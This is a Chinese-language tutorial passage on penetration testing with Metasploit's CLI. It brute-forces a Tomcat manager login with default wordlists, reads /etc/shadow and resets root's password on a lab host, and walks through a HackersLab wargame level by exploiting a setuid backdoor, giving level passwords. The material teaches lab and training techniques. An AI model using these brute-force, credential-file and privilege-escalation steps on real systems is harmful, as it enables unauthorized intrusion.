
# Metasploit 框架的 CLI

Metasploit CLI（msfcli）是允许 Metasploit 框架执行其任务的一个接口。这是一个学习如何管理 Metasploit 框架或评估/编写新漏洞利用工具的良好接口。如果需要将其用于脚本中对任务进行自动化处理，它也非常有用。

```
# msfcli -h
# msfcli
# msfcli [Exploit Route] [Option = Value]
```

以下示例将使用名为“MySQL 服务器版本枚举”的辅助模块，该模块可用于枚举 MySQL 服务器的版本。

在以下示例中，将在 Metasploit 框架中使用名为“Tomcat 应用管理器登录工具”的辅助模块，该模块将简单地尝试使用特定的用户和密码身份验证到 Tomcat 应用管理器实例。

```
msf> search tomcat
msf> use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary (tomcat_mgr_login)> show options
msf auxiliary (tomcat_mgr_login)> set RHOSTS [Objective IP]
msf auxiliary (tomcat_mgr_login)> set RPORT 8180
msf auxiliary (tomcat_mgr_login)> set USER_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
msf auxiliary (tomcat_mgr_login)> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
msf auxiliary (tomcat_mgr_login)> exploit
msf auxiliary (tomcat_mgr_login)> back
Using common usernames
```

下面展示的演示内容旨在加强课程中介绍的一些工具的使用。这些演示重点针对漏洞利用和后渗透阶段，即攻击者在利用漏洞获取系统访问权限后所执行的过程。

### 使用本地漏洞利用进行权限提升的演示。

```
# ssh -l msfadmin 192.168.159.129
```

进入系统后，我们接着使用 "sudo" 命令。

```
# sudo cat /etc/shadow
# sudo passwd root
```

输入一个新密码，然后执行：

```
# su -
# id
```

后渗透阶段将与第一个示例中详述的阶段相似。

# 第 7 章 – 解决等级问题

## 等级 0 问题

**登录：level08 密码：guest 学习：等级 0 介绍**

由于极其简单，其目的仅是帮助你理解在进入下一等级所需的一些概念。我将借此空间进行解释。我们在 level0 的主要目标，正如其他所有等级一样，是获取下一等级的密码。这可以通过运行 `bin` 目录中的 `pass` 命令来完成。尝试连接到 HackersLab 并输入 `pass`。会出现一个屏幕，它会展示并告诉你 level0 的密码。那么，要获取 level1 的密码，我必须以该用户身份登录吗？这是如何可能的？

还有另一种方法。在每个等级，都有一个文件的 UID（用户标识号）高于你的，且 GID（相同组标识号）也与你的相同。任务是：如何探索该文件，以便通过它执行 `pass` 命令并获取下一个密码？现在如果我们通过它执行，而它拥有更高的用户权限（UID），我们的系统将“认为”我们是那个其他用户。困难吗？让我们看一个例子。

假设我们连接到 HackersLab。让我们创建一个虚构的 level0，仅作为测试：

```
Login: level0
Password: [level0]
[level0 @ level0] $ whoami
level0
[level0 @ level0] $ id
UID=2000 GID=2000 OTHER ANY=9999
```

到目前为止，我们取得了什么成果？我们成功登录到 level0，输入了 `whoami` 命令，它通知我们用户名是 level0，以及 `id` 命令，它为我们提供了用户 ID（UID）、组 ID（GID）以及其他我们不需要的事情。

现在我让系统搜索那些 UID 高于我们的文件。例如，如果我们的 UID 是 2000，那么我想搜索 UID 为 2001（level1）的文件。

```
[level0 @ level0] $ find / -uid 2001 -gid 2000
/tmp/suzuki: Permission Denied
/bin/joy: Permission Denied
```

权限被拒绝
/etc/test
/usr/local/yu: 权限被拒绝
/var/shenmue: 权限被拒绝。

我要求系统向我展示所有允许访问的文件，这些文件属于用户 level1（其 UID 为 2001）且属于组 level0（GID 为 2000）。为什么要查找 GID？很简单。文件需要属于我们的组，这样我们才能操作它。这一点稍后会更清晰。我们只找到了 `/etc/test` 文件。其他权限被拒绝的都是垃圾。

那么，如何只列出我们想要的文件？

```
[level0 @ level0]$ find / -uid 2001 --gid 2000 2>/dev/null
/etc/test
```

重新执行命令时，我加入了字符串 `2> /dev/null`，这告诉系统“将任何不必要的信息（2）发送到（>）垃圾桶（/dev/null）”。因此，我们只得到了预期的结果。所以，让我们列出文件内部的内容。

```
[level0 @ level0]$ ls -la /etc/test
-rwxr-x--- 1 level1 level0 10876 Mar 8 06:24 test
```

根据信息，我们确认了我们要找的内容。这是一个由用户 level1 创建的文件，属于组 level0。创建该用户的用户拥有完全权限，组用户仅允许执行，其他用户甚至连执行都不允许。纯粹出于好奇，我可以用用户名而不是 UID 来浏览文件吗？当然可以！

完美。我们以相同的方式找到了文件。我们如何仅运行该文件，让我们试试：

```
[level0 @ level0] $ cd /etc
[level0 @ level0 etc]$ ./test
Error: file not found.
```

发生了一个错误。这是因为我们的可执行文件不在 PATH 中。`PATH` 是一个变量，指示哪些目录是你所在目录中可以运行的文件。因此，我们只能将“./”（点和斜杠）放在可执行文件前面。这样，我们必然会在不依赖 PATH 的情况下运行它。

```
[level0 @ level0 etc] $ ./test
/bin/pass
```

恭喜……level1 的密码是 xxxxx。准备好了！在我们的假设示例中，test 文件运行了 pass（记住，那个给我们密码的命令？）。但它给我们的是 level1 的密码而不是 0 的？这是因为 test 拥有 level1 的用户权限，所以我们欺骗了 pass 命令，它给了我们要的奖品。在每个等级，这都必须以不同的方式完成。

如果你还没有理解这一点，我们现在将回答问题，在实践部分一步一步地讲解，然后，我们将通过 telnet 连接到 drill.hackerslab.org：

```
Login: level0
Password: guest
Connecting to level0.
```

我们进入了。我输入了 `whoami` 和 `id` 命令来查看用户名和标识号（IDs）。这不需要这样做；我只是为了方便你理解才做的。我们现在准备好搜索目标文件了。我输入了 `find / -user level1 -group level0 2> /dev/null` 来查找由 level1 创建且组为 level0 的文件。系统找到了一些文件，包括 `/dev/.hi`。Dev 意味着设备。遵循等级提示，我将先尝试这个文件。我列出了信息，看到它对 level0 组的用户具有执行权限。所以让我们运行它，看看会发生什么。我输入了 `cd /dev` 以访问目标文件所在的目录。我输入了 `.hi`。系统返回错误，说未找到命令。这意味着该命令不在 PATH 中。没问题……我们在命令前加上“./”并执行它：`./.hi`。显然，什么也没发生。

让我们检查一下：让我们试试 `id` 命令。哦！一个惊喜！出现了一个新的 ID，带有 EUID 编号 2001（level1）。这个 EUID 之前并不存在……它是被程序赋予我们的。然后我们将尝试 `whoami` 命令，只是为了解除疑惑。看！命令通知我们我们是 level1（或者至少我们拥有 level1 的权限）。`.hi` 是如何做到这一点的？很简单，它是一个后门（资金或特洛伊木马）。当我们运行它的瞬间，它执行了 `/bin/sh` 命令，并在第一个 shell（命令会话）内部创建了另一个 shell，但使用的是你的权限。这意味着，如果我们尝试输入 `pass` 命令（它返回等级密码），现在我们将获得……下一等级的密码！！！那么，level1 的密码就是 newworld。

